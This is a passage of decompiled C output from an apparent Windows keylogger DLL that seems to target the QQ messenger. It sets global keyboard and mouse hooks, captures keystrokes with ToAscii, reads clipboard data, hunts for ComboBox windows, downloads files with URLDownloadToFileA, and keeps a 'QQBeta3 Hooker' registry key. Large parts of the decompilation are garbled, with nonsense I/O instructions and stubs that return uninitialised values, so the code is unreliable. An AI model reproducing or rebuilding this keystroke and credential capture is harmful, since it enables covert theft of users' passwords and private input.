    int32_t result; // 0x404c08
    return result;
}

// Address range: 0x404c10 - 0x404c35
int32_t function_404c10(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404c1b
    __writefsdword(0, (int32_t)&v1);
    g96++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404c35 - 0x404c3a
int32_t function_404c35(void) {
    // 0x404c35
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404c3a - 0x404c3c
int32_t function_404c3a(void) {
    // 0x404c3a
    int32_t result; // 0x404c3a
    return result;
}

// Address range: 0x404c3c - 0x404c3e
int32_t function_404c3c(int32_t a1) {
    // 0x404c3c
    int32_t result; // 0x404c3c
    return result;
}

// Address range: 0x404c40 - 0x404c48
int32_t function_404c40(void) {
    // 0x404c40
    g96--;
    int32_t result; // 0x404c40
    return result;
}

// Address range: 0x404c48 - 0x404c4e
int32_t function_404c48(int32_t * a1, char * a2, char * a3, int32_t a4, int32_t * a5) {
    // 0x404c48
    return URLDownloadToFileA(a1, a2, a3, a4, a5);
}

// Address range: 0x404c50 - 0x404c75
int32_t function_404c50(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404c5b
    __writefsdword(0, (int32_t)&v1);
    g97++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404c75 - 0x404c7a
int32_t function_404c75(void) {
    // 0x404c75
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404c7a - 0x404c7c
int32_t function_404c7a(void) {
    // 0x404c7a
    int32_t result; // 0x404c7a
    return result;
}

// Address range: 0x404c7c - 0x404c7e
int32_t function_404c7c(int32_t a1) {
    // 0x404c7c
    int32_t result; // 0x404c7c
    return result;
}

// Address range: 0x404c80 - 0x404c88
int32_t function_404c80(void) {
    // 0x404c80
    g97--;
    int32_t result; // 0x404c80
    return result;
}

// Address range: 0x404c88 - 0x404c9e
int32_t function_404c88(void) {
    // 0x404c88
    int32_t v1; // 0x404c88
    int32_t v2 = v1 & 255;
    if ((char)v1 < 10) {
        // 0x404c8c
        return v2 + 48;
    }
    // 0x404c95
    return v2 + 55;
}

// Address range: 0x404ca0 - 0x404dc4
int32_t function_404ca0(void) {
    // 0x404ca0
    function_4036b8();
    int32_t v1 = __readfsdword(0); // bp-52, 0x404cc9
    int32_t v2 = &v1; // 0x404cc9
    __writefsdword(0, v2);
    function_403370();
    int32_t v3 = function_4034c8(); // 0x404cd9
    int32_t v4 = v2; // 0x404ce2
    int32_t v5; // 0x404ca0
    int32_t v6; // 0x404ca0
    int32_t v7; // 0x404ca0
    int32_t v8; // 0x404ca0
    int32_t v9; // 0x404ca0
    unsigned char v10; // 0x404cf0
    if (v3 >= 1) {
        // 0x404ced
        v5 = 1;
        v7 = v2;
        v6 = v3;
        while (true) {
          lab_0x404ced:
            // 0x404ced
            v8 = v7;
            int32_t v11; // 0x404ca0
            v10 = *(char *)(v11 - 1 + v5);
            if (v10 != 32) {
                if (v10 < 32) {
                    goto lab_0x404d2b;
                } else {
                    unsigned char v12 = v10 - 32; // 0x404d19
                    if (v12 < 96) {
                        // branch -> 0x404d29
                    }
                    // 0x404d29
                    if (v12 >= 95) {
                        // 0x404d80
                        function_403464();
                        function_4034d0();
                        v9 = v8;
                        goto lab_0x404d99;
                    } else {
                        goto lab_0x404d2b;
                    }
                }
            } else {
                // 0x404cf7
                function_4034d0();
                v9 = v8;
                goto lab_0x404d99;
            }
        }
    }
  lab_0x404da1:
    // 0x404da1
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x404dcb;
    function_403394();
    return function_403370();
  lab_0x404d2b:
    // 0x404d2b
    *(int32_t *)(v8 - 4) = (int32_t)(v10 & 15);
    *(int32_t *)(v8 - 8) = (int32_t)&g1;
    function_404c88();
    function_403464();
    *(int32_t *)(v8 - 12) = 0;
    function_404c88();
    function_403464();
    int32_t v13 = v8 - 16; // 0x404d6f
    *(int32_t *)v13 = 0;
    function_403588((int32_t)&g111);
    v9 = v13;
    goto lab_0x404d99;
  lab_0x404d99:;
    int32_t v14 = v6 - 1; // 0x404d9a
    v5++;
    v7 = v9;
    v6 = v14;
    v4 = v9;
    if (v14 == 0) {
        // break -> 0x404da1
        goto lab_0x404da1;
    }
    goto lab_0x404ced;
}

// Address range: 0x404dc4 - 0x404dc9
int32_t function_404dc4(void) {
    // 0x404dc4
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404dc9 - 0x404dcb
int32_t function_404dc9(void) {
    // 0x404dc9
    int32_t result; // 0x404dc9
    return result;
}

// Address range: 0x404dcb - 0x404dd2
int32_t function_404dcb(int32_t a1, int32_t a2, int32_t a3) {
    // 0x404dcb
    int32_t result; // 0x404dcb
    return result;
}

// Address range: 0x404def - 0x404e66
int32_t function_404def(void) {
    // 0x404def
    int32_t v1; // 0x404def
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x404def
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    *(char *)0x55000000 = *(char *)0x55000000 + (char)(v2 / 256);
    function_4036b8();
    int32_t v4 = __readfsdword(0); // bp-24, 0x404e19
    __writefsdword(0, (int32_t)&v4);
    function_403588(v2);
    int32_t v5 = function_4036c8(); // 0x404e3e
    URLDownloadToFileA((int32_t *)v5, NULL, (char *)&g111, (int32_t)&g111, &g111);
    __writefsdword(0, 0);
    return function_403394();
}

// Address range: 0x404df8 - 0x404df9
int32_t function_404df8(void) {
    // 0x404df8
    int32_t result; // 0x404df8
    return result;
}

// Address range: 0x404e66 - 0x404e6b
int32_t function_404e66(void) {
    // 0x404e66
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404e6b - 0x404e6d
int32_t function_404e6b(void) {
    // 0x404e6b
    int32_t result; // 0x404e6b
    return result;
}

// Address range: 0x404e6d - 0x404e72
int32_t function_404e6d(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x404e6d
    int32_t result; // 0x404e6d
    return result;
}

// Address range: 0x404e77 - 0x404ea5
int32_t function_404e77(void) {
    // 0x404e77
    int32_t v1; // 0x404e77
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x404e77
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    int32_t v4; // 0x404e77
    uint32_t v5; // 0x404e77
    *(char *)v4 = *(char *)&v4 + (char)(v5 / 256);
    int32_t v6 = v2;
    *(char *)v6 = *(char *)&v2 + (char)v6;
    int32_t v7; // 0x404e77
    char * v8 = (char *)(v7 - 117); // 0x404e7f
    int32_t v9; // 0x404e77
    *v8 = *v8 + (char)v9;
    __asm_in((int16_t)v9);
    int32_t v10 = __readfsdword(0); // bp-12, 0x404e8b
    __writefsdword(0, (int32_t)&v10);
    g98++;
    __writefsdword(0, v10);
    return 0;
}

// Address range: 0x404ea5 - 0x404eaa
int32_t function_404ea5(void) {
    // 0x404ea5
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x404eaa - 0x404eac
int32_t function_404eaa(void) {
    // 0x404eaa
    int32_t result; // 0x404eaa
    return result;
}

// Address range: 0x404eac - 0x404eae
int32_t function_404eac(int32_t a1) {
    // 0x404eac
    int32_t result; // 0x404eac
    return result;
}

// Address range: 0x404eb0 - 0x404eb8
int32_t function_404eb0(void) {
    // 0x404eb0
    g98--;
    int32_t result; // 0x404eb0
    return result;
}

// Address range: 0x404eb8 - 0x404f37
int32_t function_404eb8(void) {
    // 0x404eb8
    function_4033c4();
    int32_t v1 = 0; // bp-116, 0x404ecc
    int32_t v2 = 0; // bp-128, 0x404ed2
    char * v3 = "Software\\mz\\QQBeta3 Hooker"; // bp-132, 0x404ed4
    int32_t result = function_40438c(0, &v1, 1, 0, "Software\\mz\\QQBeta3 Hooker", -0x7fffffff); // 0x404ede
    if (result != 0) {
        // 0x404f32
        return result;
    }
    // 0x404eed
    v3 = (char *)101;
    int32_t v4 = function_404394(101, (int32_t *)&v3, &v2, &g27, 0, "First Run", -0x7fffffff); // 0x404f10
    if (v4 == 0) {
        // 0x404f19
        function_4034b0();
    }
    // 0x404f32
    return function_404374();
}

// Address range: 0x404f3b - 0x40500e
int32_t function_404f3b(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = a1;
    int32_t v2 = a2;
    int32_t v3; // 0x404f3b
    *(int32_t *)v3 = v3 + 1;
    int32_t result; // 0x404f3b
    int32_t v4 = result;
    *(char *)v4 = *(char *)&result + (char)v4;
    int32_t v5; // 0x404f3b
    char * v6 = (char *)(v5 + 122); // 0x404f3f
    uint32_t v7; // 0x404f3b
    *v6 = *v6 + (char)(v7 / 256);
    unsigned char v8 = *(char *)&result; // 0x404f42
    unsigned char v9 = v8 + (char)result; // 0x404f42
    *(char *)result = v9;
    int32_t v10; // 0x404f3b
    __asm_outsd((int16_t)v3, v10);
    if (v9 == 0) {
        unknown_4fc0();
    }
    // 0x404f49
    result = v2;
    int32_t * v11; // 0x404f3b
    int32_t v12; // 0x404f3b
    int32_t v13; // 0x404f3b
    if (v9 < v8) {
        // 0x404fb1
        *(char *)v13 = (char)v13 + (char)a3;
        char * v14 = (char *)a4; // 0x404fb4
        *v14 = *v14 + (char)(a3 / 256);
        v11 = &v1;
        goto lab_0x404fb7;
    } else {
        char v15 = llvm_ctpop_i8(v9); // 0x404f42
        *(int32_t *)v13 = __asm_insd((int16_t)a4);
        if ((v15 & 1) == 0) {
            // 0x404fac
            return result;
        }
        // 0x404f50
        v1 = a3;
        v2 = a3;
        int32_t v16 = a4 + 1; // 0x404f52
        v11 = &v2;
        if (v16 == 0) {
            goto lab_0x404fb7;
        } else {
            int32_t v17 = result - 1; // 0x404f58
            result = v17;
            int16_t v18 = v16; // 0x404f59
            int32_t * v19 = (int32_t *)a7; // 0x404f59
            __asm_outsd(v18, *v19);
            __asm_outsd(v18, *v19);
            char * v20 = (char *)(a7 + 105); // 0x404f5f
            unsigned char v21 = *v20; // 0x404f5f
            unsigned char v22 = v21 + (char)v17; // 0x404f5f
            *v20 = v22;
            v12 = 0;
            if (v22 >= v21) {
                if (v22 == 0) {
                    // 0x404f86
                    *(int32_t *)-4 = *(int32_t *)result;
                    __writefsdword(result, -4);
                    *(int32_t *)-8 = (int32_t)"Software\\mz\\QQBeta3 Hooker";
                    *(int32_t *)-12 = -0x7fffffff;
                    RegDeleteKeyA(&g111, (char *)&g111);
                    *(int32_t *)(a6 - 8) = 0;
                    int32_t result2 = a6 - 12; // 0x404f9f
                    *(int32_t *)result2 = 1;
                    *(int32_t *)-16 = result2;
                    return result2;
                }
                // 0x404f66
                *(int32_t *)-4 = v16;
                v12 = -4;
            }
            goto lab_0x404fd7;
        }
    }
  lab_0x404fb7:;
    int32_t v23 = (int32_t)v11;
    *(int32_t *)(v23 - 4) = 0;
    *(int32_t *)(v23 - 8) = 0;
    *(int32_t *)(v23 - 12) = (int32_t)"Software\\mz\\QQBeta3 Hooker";
    *(int32_t *)(v23 - 16) = -0x7fffffff;
    RegCreateKeyExA(&g111, (char *)&g111, (int32_t)&g111, (char *)&g111, (int32_t)&g111, (int32_t)&g111, (struct _SECURITY_ATTRIBUTES *)&g111, (int32_t **)&g111, &g111);
    int32_t v24 = function_4034c8(); // 0x404fcd
    int32_t v25 = v23 - 20; // 0x404fd3
    *(int32_t *)v25 = v24 + 1;
    v12 = v25;
    goto lab_0x404fd7;
  lab_0x404fd7:
    // 0x404fd7
    *(int32_t *)(v12 - 4) = function_4036c8();
    *(int32_t *)(v12 - 8) = 1;
    *(int32_t *)(v12 - 12) = 0;
    int32_t * v26 = (int32_t *)(v12 - 16); // 0x404fe1
    *v26 = (int32_t)"First Run";
    int32_t * v27 = (int32_t *)(a6 - 8); // 0x404fe6
    *(int32_t *)(v12 - 20) = *v27;
    RegSetValueExA(&g111, (char *)&g111, (int32_t)&g111, (int32_t)&g111, (char *)&g111, (int32_t)&g111);
    int32_t * v28 = (int32_t *)(v12 - 24); // 0x404ff2
    *v28 = *v27;
    function_404374();
    __writefsdword(0, *v28);
    *v26 = 0x405015;
    return function_403370();
}

// Address range: 0x40500e - 0x405013
int32_t function_40500e(void) {
    // 0x40500e
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x405013 - 0x405015
int32_t function_405013(void) {
    // 0x405013
    int32_t result; // 0x405013
    return result;
}

// Address range: 0x405015 - 0x405019
int32_t function_405015(void) {
    // 0x405015
    int32_t result; // 0x405015
    return result;
}

// Address range: 0x405019 - 0x405092
int32_t function_405019(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x405019
    int32_t v1; // 0x405019
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x405019
    char * v3 = (char *)(v2 + 111); // 0x40501b
    unsigned char v4 = *v3; // 0x40501b
    int32_t v5; // 0x405019
    unsigned char v6 = v4 + (char)v5; // 0x40501b
    *v3 = v6;
    if (v6 == 0) {
        unknown_5098();
    }
    if (v6 < v4) {
        // 0x40508f
        return CloseClipboard();
    }
    char v7 = llvm_ctpop_i8(v6); // 0x40501b
    *(int32_t *)a8 = __asm_insd((int16_t)a4);
    if ((v7 & 1) == 0) {
        // 0x405084
        GlobalUnlock(&g111);
        // 0x40508f
        return CloseClipboard();
    }
    int32_t v8 = a4 + 1; // 0x40502a
    if (v8 == 0) {
        // 0x40508f
        return result;
    }
    int32_t v9 = result - 1; // 0x405030
    int16_t v10 = v8; // 0x405031
    int32_t * v11 = (int32_t *)a7; // 0x405031
    __asm_outsd(v10, *v11);
    __asm_outsd(v10, *v11);
    char * v12 = (char *)(a7 + 105); // 0x405037
    char v13 = v9; // 0x405037
    char v14 = *v12 + v13; // 0x405037
    *v12 = v14;
    if (v14 != 0) {
        // 0x40503e
        *(int32_t *)-4 = v8;
        char * v15 = (char *)v9; // 0x405041
        *v15 = *v15 + v13;
        char * v16 = (char *)(a5 + 86); // 0x405043
        *v16 = *v16 + (char)v8;
        *(int32_t *)-8 = a8;
        function_403370();
        *(int32_t *)-12 = 0;
        return OpenClipboard(&g111);
    }
    char * v17 = (char *)(2 * a6 + 106); // 0x40505e
    *v17 = 2 * *v17;
    int32_t * v18 = GetClipboardData((int32_t)&g111); // 0x405063
    if (v18 == NULL) {
        // 0x40508f
        return CloseClipboard();
    }
    int32_t v19 = (int32_t)v18; // 0x405063
    *(int32_t *)-4 = v19;
    if (GlobalLock(&g111) == NULL) {
        // 0x40508f
        return CloseClipboard();
    }
    // 0x40507a
    function_403474();
    *(int32_t *)-8 = v19;
    // 0x405084
    GlobalUnlock(&g111);
    // 0x40508f
    return CloseClipboard();
}

// Address range: 0x405094 - 0x4050e1
int32_t DllGetClassObject(int32_t a1) {
    // 0x405094
    int32_t v1; // 0x405094
    char * lpWindowName = (char *)v1; // 0x405097
    char * lpThreadAttributes = lpWindowName; // bp-8, 0x405097
    if (*(int32_t *)*(int32_t *)0x409138 == 0) {
        // 0x4050d0
        *(int32_t *)a1 = 0;
        return -0x7ffbfeef;
    }
    // 0x4050a7
    int32_t lpClassName; // 0x405094
    if (FindWindowA((char *)lpClassName, lpWindowName) == NULL) {
        // 0x4050ba
        CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))66, (int32_t *)0x406d6c, 0, NULL);
    }
    // 0x4050d0
    *(int32_t *)a1 = 0;
    return -0x7ffbfeef;
}

// Address range: 0x4050fc - 0x4050ff
int32_t DllCanUnloadNow(void) {
    // 0x4050fc
    return 0;
}

// Address range: 0x405100 - 0x405103
int32_t DllRegisterServer(void) {
    // 0x405100
    return 0;
}

// Address range: 0x405104 - 0x405107
int32_t DllUnregisterServer(void) {
    // 0x405104
    return 0;
}

// Address range: 0x405108 - 0x405119
int32_t function_405108(void) {
    // 0x405108
    return function_4033c4();
}

// Address range: 0x40511f - 0x4051f3
int32_t function_40511f(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40511f
    int32_t v1; // 0x40511f
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x405122
    *(char *)v1 = v3;
    if (v3 >= v2) {
        // 0x40518c
        __writefsdword(0, a3);
        return 0;
    }
    // 0x405126
    int32_t v4; // 0x40511f
    int16_t v5 = v4; // 0x405144
    int32_t v6; // 0x40511f
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x40511f
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x40514a
    int32_t v9; // 0x40511f
    char * v10 = (char *)v9; // 0x40514a
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x40514f
    int64_t v12 = 103 * v11; // 0x40514f
    int32_t v13 = v12; // 0x40514f
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x405154
    *v14 = 0x6b64736b;
    int32_t * v15 = (int32_t *)(v13 - 8); // 0x405159
    *v15 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v16 = *(char *)&v7; // 0x4051c4
        unsigned char v17 = v16 + v2; // 0x4051c4
        *(char *)v7 = v17;
        if (v17 < v16) {
            // 0x4051c8
            return function_405108();
        }
        // 0x4051dd
        __writefsdword(0, *v15);
        *(int32_t *)v13 = 0x4051fa;
        return function_403370();
    }
    // 0x40515e
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v18 = (int32_t *)(v13 - 16); // 0x405163
    *v18 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v19 = v13 + 4; // 0x405174
    int32_t * v20 = (int32_t *)v19; // 0x405174
    int32_t v21 = *v20; // 0x405174
    *(char *)97 = __asm_insb((int16_t)*v14);
    char * v22 = (char *)v21; // 0x40517a
    *v22 = *v22 + (char)v21;
    *v20 = *v18;
    *(int32_t *)v13 = v19;
    *v14 = 0x4051a1;
    *v15 = __readfsdword(0);
    return 0;
}

// Address range: 0x4051f3 - 0x4051f8
int32_t function_4051f3(void) {
    // 0x4051f3
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4051f8 - 0x4051fa
int32_t function_4051f8(void) {
    // 0x4051f8
    int32_t result; // 0x4051f8
    return result;
}

// Address range: 0x4051fa - 0x4051fd
int32_t function_4051fa(int32_t a1, int32_t a2) {
    // 0x4051fa
    int32_t result; // 0x4051fa
    return result;
}

// Address range: 0x405200 - 0x405314
int32_t function_405200(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-292, 0x405222
    int32_t v2 = &v1; // 0x405222
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x405237
    if (function_407910() != 0) {
        int32_t uFlags; // 0x405200
        switch (uFlags) {
            case 8: {
                // 0x40524b
                function_4079ac();
                function_403768();
                v3 = v2;
                // break -> 0x4052fb
                break;
            }
            case 46: {
                // 0x40526a
                function_4079ac();
                function_403768();
                v3 = v2;
                // break -> 0x4052fb
                break;
            }
            default: {
                // 0x405287
                int32_t lpKeyState; // bp-264, 0x405200
                GetKeyboardState((char *)&lpKeyState);
                int32_t v4; // bp-316, 0x405200
                int32_t v5 = &v4; // 0x4052aa
                int32_t uScanCode; // bp-8, 0x405200
                uint32_t v6; // 0x405200
                int32_t v7 = ToAscii(0, (int32_t)&uScanCode, (char *)&lpKeyState, (int16_t *)(v6 / 0x10000 & 255), uFlags); // 0x4052ab
                v3 = v5;
                if (v7 == 1) {
                    // 0x4052b3
                    v3 = v5;
                    if (function_407674() != 0) {
                        // 0x4052bf
                        v3 = v5;
                        if (function_4034c8() <= 15) {
                            // 0x4052d0
                            function_4079ac();
                            function_403464();
                            function_4037b0();
                            v3 = v5;
                        }
                    }
                }
                // break -> 0x4052fb
                break;
            }
        }
    }
    // 0x4052fb
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x40531b;
    return function_403370();
}

// Address range: 0x405314 - 0x405319
int32_t function_405314(void) {
    // 0x405314
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x405319 - 0x40531b
int32_t function_405319(void) {
    // 0x405319
    int32_t result; // 0x405319
    return result;
}

// Address range: 0x40531b - 0x405322
int32_t function_40531b(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40531b
    int32_t result; // 0x40531b
    return result;
}

// Address range: 0x405324 - 0x4053e3
int32_t function_405324(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x405337
    int32_t v2 = &v1; // 0x405337
    __writefsdword(0, v2);
    function_407910();
    __writefsdword(0, v1);
    *(int32_t *)(v2 + 8) = 0x4053ea;
    return function_403394();
}

// Address range: 0x4053e3 - 0x4053e8
int32_t function_4053e3(void) {
    // 0x4053e3
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x4053e8 - 0x4053ea
int32_t function_4053e8(void) {
    // 0x4053e8
    int32_t result; // 0x4053e8
    return result;
}

// Address range: 0x4053ea - 0x4053f0
int32_t function_4053ea(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4053ea
    int32_t result; // 0x4053ea
    return result;
}

// Address range: 0x4053f0 - 0x40546a
int32_t function_4053f0(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-24, 0x405400
    int32_t v2 = &v1; // 0x405400
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x40540f
    if (function_407880() != 0) {
        // 0x405411
        int32_t lpszWindow; // 0x4053f0
        int32_t * hWnd = FindWindowExA(NULL, (int32_t *)"ComboBox", NULL, (char *)lpszWindow); // 0x40541b
        int32_t v4 = (int32_t)hWnd; // bp-44, 0x405422
        int32_t v5 = &v4; // 0x405422
        if (!IsWindow(hWnd)) {
            // 0x40544f
            function_407b3c();
            v3 = v5;
        } else {
            // 0x40542c
            function_4076e0();
            function_4033c4();
            function_407a08();
            v3 = v5;
        }
    }
    // 0x405454
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x405471;
    return function_403370();
}

// Address range: 0x40546a - 0x40546f
int32_t function_40546a(void) {
    // 0x40546a
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x40546f - 0x405471
int32_t function_40546f(void) {
    // 0x40546f
    int32_t result; // 0x40546f
    return result;
}

// Address range: 0x405471 - 0x405475
int32_t function_405471(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405471
    int32_t result; // 0x405471
    return result;
}

// Address range: 0x405475 - 0x4054ef
int32_t function_405475(void) {
    // 0x405475
    int32_t v1; // 0x405475
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x405475
    char * v3 = (char *)(v2 + 111); // 0x405477
    int32_t v4; // 0x405475
    *v3 = *v3 + (char)v4;
    int32_t v5; // 0x405475
    int16_t v6 = v5; // 0x40547a
    int32_t v7; // 0x405475
    *(int32_t *)v7 = __asm_insd(v6);
    int32_t v8 = __asm_bound(*(int64_t *)(v7 + 66)); // 0x40547b
    int32_t v9; // 0x405475
    __asm_outsd(v6, v9);
    int32_t v10 = v4;
    *(char *)v10 = *(char *)&v4 + (char)v10;
    char * v11 = (char *)(v8 - 117); // 0x405483
    *v11 = *v11 + (char)v5;
    __asm_in(v6);
    int32_t hhk = *(int32_t *)(v8 + 16); // 0x40548a
    int32_t nCode = *(int32_t *)(v8 + 12); // 0x40548d
    int32_t wParam = *(int32_t *)(v8 + 8); // 0x405490
    if (nCode == 1 != (wParam == 0 == (*(int32_t *)*(int32_t *)0x40912c != 0))) {
        // 0x4054da
        return CallNextHookEx((int32_t *)hhk, nCode, wParam, g99);
    }
    // 0x4054ab
    v4 = hhk;
    switch (*(int32_t *)(hhk + 4)) {
        case 256: {
            // 0x4054c2
            function_405200(v2, v9, v7);
            // break -> 0x4054da
            break;
        }
        case 770: {
            // 0x4054d3
            function_405324(v2, v9, v7);
            // break -> 0x4054da
            break;
        }
    }
    // 0x4054da
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, g99);
}

// Address range: 0x4054f0 - 0x405537
int32_t function_4054f0(int32_t hhk, int32_t nCode, int32_t wParam) {
    // 0x4054f0
    if (wParam == 0 != g34 != 0) {
        // 0x405520
        return CallNextHookEx((int32_t *)hhk, nCode, wParam, g100);
    }
    // 0x40550e
    if (*(int32_t *)(hhk + 8) == 2) {
        // 0x405518
        int32_t v1; // 0x4054f0
        int32_t v2; // 0x4054f0
        int32_t v3; // 0x4054f0
        function_4053f0(v2, v3, v1);
    }
    // 0x405520
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, g100);
}

// Address range: 0x405538 - 0x40556d
int32_t function_405538(void) {
    // 0x405538
    g99 = (int32_t)SetWindowsHookExA(0, g83, (int32_t *)0x405484, 3);
    int32_t result = (int32_t)SetWindowsHookExA(0, g83, (int32_t *)0x4054f0, 4); // 0x405562
    g100 = result;
    return result;
}

// Address range: 0x405570 - 0x405587
int32_t function_405570(void) {
    // 0x405570
    UnhookWindowsHookEx((int32_t *)g99);
    return UnhookWindowsHookEx((int32_t *)g100);
}

// Address range: 0x405588 - 0x405599
int32_t function_405588(void) {
    // 0x405588
    return function_4033c4();
}

// Address range: 0x40559f - 0x405673
int32_t function_40559f(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40559f
    int32_t v1; // 0x40559f
    unsigned char v2 = (char)v1;
    unsigned char v3 = 2 * v2; // 0x4055a2
    *(char *)v1 = v3;
    if (v3 >= v2) {
        // 0x40560c
        __writefsdword(0, a3);
        return 0;
    }
    // 0x4055a6
    int32_t v4; // 0x40559f
    int16_t v5 = v4; // 0x4055c4
    int32_t v6; // 0x40559f
    __asm_outsb(v5, *(char *)(100 * *(int32_t *)(v6 + 110)));
    int32_t v7; // 0x40559f
    __readfsdword(v7 + 115);
    char v8 = __asm_insb(v5); // 0x4055ca
    int32_t v9; // 0x40559f
    char * v10 = (char *)v9; // 0x4055ca
    *v10 = v8;
    int64_t v11 = (int64_t)*(int32_t *)(v6 + 104 & 0xffff); // 0x4055cf
    int64_t v12 = 103 * v11; // 0x4055cf
    int32_t v13 = v12; // 0x4055cf
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x4055d4
    *v14 = 0x6b64736b;
    int32_t * v15 = (int32_t *)(v13 - 8); // 0x4055d9
    *v15 = 97;
    *v10 = __asm_insb(v5);
    if (v12 == 0x6700000000 * v11 / 0x100000000) {
        unsigned char v16 = *(char *)&v7; // 0x405644
        unsigned char v17 = v16 + v2; // 0x405644
        *(char *)v7 = v17;
        if (v17 < v16) {
            // 0x405648
            return function_405588();
        }
        // 0x40565d
        __writefsdword(0, *v15);
        *(int32_t *)v13 = 0x40567a;
        return function_403370();
    }
    // 0x4055de
    *(int32_t *)(v13 - 12) = 0x666a6766;
    int32_t * v18 = (int32_t *)(v13 - 16); // 0x4055e3
    *v18 = 107;
    *(int32_t *)(v13 - 20) = 97;
    *v10 = __asm_insb(v5);
    *(int32_t *)(v13 - 24) = 97;
    int32_t v19 = v13 + 4; // 0x4055f4
    int32_t * v20 = (int32_t *)v19; // 0x4055f4
    int32_t v21 = *v20; // 0x4055f4
    *(char *)97 = __asm_insb((int16_t)*v14);
    char * v22 = (char *)v21; // 0x4055fa
    *v22 = *v22 + (char)v21;
    *v20 = *v18;
    *(int32_t *)v13 = v19;
    *v14 = 0x405621;
    *v15 = __readfsdword(0);
    return 0;
}

// Address range: 0x405673 - 0x405678
int32_t function_405673(void) {
    // 0x405673
    return function_402d84((int32_t)&g111, (int32_t)&g111);
}

// Address range: 0x405678 - 0x40567a
int32_t function_405678(void) {
    // 0x405678
    int32_t result; // 0x405678
    return result;
}

// Address range: 0x40567a - 0x40567d
int32_t function_40567a(int32_t a1, int32_t a2) {
    // 0x40567a
    int32_t result; // 0x40567a
    return result;
}

// Address range: 0x405683 - 0x40573b
int32_t function_405683(int32_t a1, uint32_t a2, uint32_t a3) {
    // 0x405683
    int32_t v1; // 0x405683
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x405683
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    int32_t v3 = result; // 0x40568f
    result = a1;
    int32_t v4 = __asm_bound(*(int64_t *)(v3 + 99)); // 0x4056a3
    int32_t v5 = v4 - 2; // 0x4056a6
    *(int16_t *)v5 = 0x6a69;
    int32_t v6; // 0x405683
    int64_t v7 = (int64_t)*(int32_t *)(v6 + 110 + 2 * v6); // 0x4056ac
    int64_t v8 = 111 * v7; // 0x4056ac
    if (v8 != 0x6f00000000 * v7 / 0x100000000) {
        // 0x405724
        return result;
    }
    int32_t v9; // 0x405683
    if (v9 == 0) {
        int32_t v10 = (int32_t)((0x100000000 * (int64_t)a3 | (int64_t)result) / (int64_t)a2) + 1; // 0x40572e
        // 0x405730
        return v10 - 1;
    }
    int32_t v11; // bp-16, 0x405683
    int32_t v12; // 0x405683
    if (v9 < 0) {
        // 0x405734
        v11 = *(int32_t *)v12;
        int32_t * v13 = (int32_t *)result; // 0x405735
        *v13 = *v13 + result;
        char * v14 = (char *)(result - 119); // 0x405737
        *v14 = *v14 + (char)result;
        return result;
    }
    // 0x4056bb
    if ((llvm_ctpop_i8((char)v9) & 1) != 0) {
        int32_t * v15 = (int32_t *)a3; // 0x4056bd
        *v15 = *v15 ^ v12;
        *(int32_t *)(v4 - 38) = v3 - 1;
        *(int32_t *)(v4 - 42) = *(int32_t *)(v12 + 0x39383736) ^ v12;
        *(int32_t *)(v4 - 22) = 0;
        *(int32_t *)(v4 - 26) = 0;
